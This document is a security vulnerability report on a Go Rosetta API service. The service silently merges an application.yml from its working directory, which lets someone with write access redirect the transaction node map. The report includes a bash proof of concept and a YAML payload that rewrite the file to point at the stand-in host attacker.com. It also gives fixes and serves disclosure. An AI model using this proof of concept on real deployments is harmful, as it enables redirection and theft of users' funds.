### Title
Unauthenticated Config Merge via CWD `application.yml` Allows Node Map Hijacking

### Summary
`LoadConfig()` unconditionally calls `v.AddConfigPath(".")` and then `mergeExternalConfigFile(v)`, which silently merges any `application.yml` found in the process's current working directory. Because the env-based `nodeMap` override only fires when `len(nodeMap) != 0`, an attacker who can write a file to the CWD can replace the `Nodes` map with attacker-controlled endpoints and redirect all fund transfers without any integrity check or operator warning beyond a log line.

### Finding Description
**Exact code path:**

`rosetta/app/config/config.go`, `LoadConfig()`, lines 59–64 and 89–91:

```go
// load configuration file from current directory
v.SetConfigName(configName)          // "application"
v.AddConfigPath(".")                 // ← CWD added unconditionally
if err := mergeExternalConfigFile(v); err != nil {
    return nil, err
}
```

`mergeExternalConfigFile` (lines 122–134) calls `v.MergeInConfig()` and only ignores `viper.ConfigFileNotFoundError`; a well-formed YAML file is merged silently and logged at INFO level — not treated as a security event.

After unmarshalling, the only guard is:

```go
if len(nodeMap) != 0 {          // lines 89-91
    mirrorConfig.Rosetta.Nodes = nodeMap
}
```

`nodeMap` is populated exclusively from the `HIERO_MIRROR_ROSETTA_NODES` environment variable (line 45). When that variable is absent (the default in most deployments), `nodeMap` is `nil`/empty, the condition is false, and the `Nodes` value from the merged CWD file is used verbatim.

**Root cause:** The code treats the CWD as a trusted configuration source with no file-ownership check, no cryptographic integrity verification, and no explicit operator opt-in. The env-variable override is the only protection, but it is opt-in and absent by default.

**Exploit flow:**
1. Attacker writes the following to `<CWD>/application.yml`:
   ```yaml
   hiero:
     mirror:
       rosetta:
         nodes:
           "attacker.com:50211": "0.0.3"
   ```
2. `LoadConfig()` is called (at startup or restart).
3. `v.MergeInConfig()` finds and merges the file; `nodeMapDecodeHookFunc` validates only that `0.0.3` is a syntactically valid Hiero account ID — it does **not** validate that the endpoint is a legitimate network node.
4. `len(nodeMap) == 0` → the override branch is skipped.
5. `mirrorConfig.Rosetta.Nodes` now maps `attacker.com:50211 → 0.0.3`.
6. All subsequent SDK calls route transactions to the attacker's endpoint.

**Why existing checks fail:**
- `mergeExternalConfigFile` only rejects parse errors, not untrusted sources.
- The env-variable guard is opt-in and not set in default deployments.
- `nodeMapDecodeHookFunc` validates account-ID syntax, not endpoint legitimacy.
- The INFO log line is not a security control.

### Impact Explanation
An attacker who redirects the `Nodes` map controls which gRPC endpoint receives every transaction submitted through the Rosetta API. This enables: (a) silent transaction interception/dropping, (b) man-in-the-middle of fund transfers, (c) denial of service by pointing to a dead host. Severity is **Critical** because the direct result is loss or theft of funds with no user-visible error if the attacker's node returns plausible responses.

### Likelihood Explanation
The precondition — write access to the process CWD — is achievable in several realistic scenarios:

- The service is deployed in a world-writable or group-writable directory (misconfigured containers, `/tmp`-based deployments, shared hosting).
- A separate file-write primitive exists elsewhere in the application (e.g., log-file path traversal, asset upload endpoint).
- CI/CD pipelines or orchestration systems that run the binary from a shared workspace directory.
- Development/staging environments where directory permissions are relaxed.

Once write access is obtained, the attack is trivially repeatable on every restart and requires no authentication to the Rosetta API itself.

### Recommendation
1. **Remove `v.AddConfigPath(".")`** or gate it behind an explicit operator flag. The embedded default config (`//go:embed application.yml`) already provides safe defaults; CWD loading is unnecessary in production.
2. If CWD loading is intentionally supported, **verify file ownership** matches the process UID before merging (`os.Stat` + `stat.Sys().(*syscall.Stat_t).Uid`).
3. Alternatively, require the external config path to be supplied only via `HIERO_MIRROR_ROSETTA_API_CONFIG` (already implemented) and remove the implicit CWD search entirely.
4. Add a startup integrity check that logs a **warning or fatal error** when the `Nodes` map differs from the embedded default and no explicit override env var is set.

### Proof of Concept
```bash
# 1. Identify or set the CWD of the running rosetta process
CWD=$(readlink /proc/$(pgrep rosetta)/cwd)

# 2. Write malicious config
cat > "$CWD/application.yml" <<'EOF'
hiero:
  mirror:
    rosetta:
      nodes:
        "attacker.com:50211": "0.0.3"
EOF

# 3. Restart (or wait for next startup) — no env vars needed
# HIERO_MIRROR_ROSETTA_NODES must NOT be set (default)

# 4. Observe in logs:
#   level=info msg="Loaded external config file: <CWD>/application.yml"
#   level=info msg="Using configuration: ... Nodes:map[attacker.com:50211:{...}] ..."

# 5. All Rosetta /construction/submit calls now route to attacker.com:50211
```
